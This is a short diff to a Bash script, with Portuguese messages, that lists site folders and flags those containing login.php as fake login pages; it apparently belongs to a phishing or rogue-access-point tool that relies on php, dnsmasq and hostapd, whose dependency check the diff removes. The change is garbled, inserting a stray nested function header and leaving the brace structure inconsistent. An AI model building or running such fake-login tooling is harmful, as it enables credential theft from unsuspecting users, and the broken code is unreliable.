@@ -1,22 +1,18 @@
 #!/bin/bash
 
 list_folders() {
+  prilist_folders() {
   printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Pastas disponíveis:\e[0m\n"
   counter=1
-  for folder in $(ls -d .sites/*/); do
-    if [[ -f "$folder/login.php" ]]; then
+  for folder in $(find .sites -type d -name '*' -print); do
+    login_page="$folder/login.php"
+    if [[ -f "$login_page" ]]; then
       printf "\e[1;92m%s\e[0m: \e[1;77m%s (Página de Login Falsa)\n" $counter $folder
     else
       printf "\e[1;92m%s\e[0m: \e[1;77m%s\n" $counter $folder
     fi
     let counter++
   done
-}
-
-dependencies() {
-  command -v php > /dev/null 2>&1 || { echo >&2 "O php é necessário, mas não está instalado. Instale-o. Abortando."; exit 1; }
-  command -v dnsmasq > /dev/null 2>&1 || { echo >&2 "O dnsmasq é necessário, mas não está instalado. Instale-o. Abortando."; exit 1; }
-  command -v hostapd > /dev/null 2>&1 || { echo >&2 "O hostapd é necessário, mas não está instalado. Instale-o. Abortando."; exit 1; }
 }
 
 banner()  {
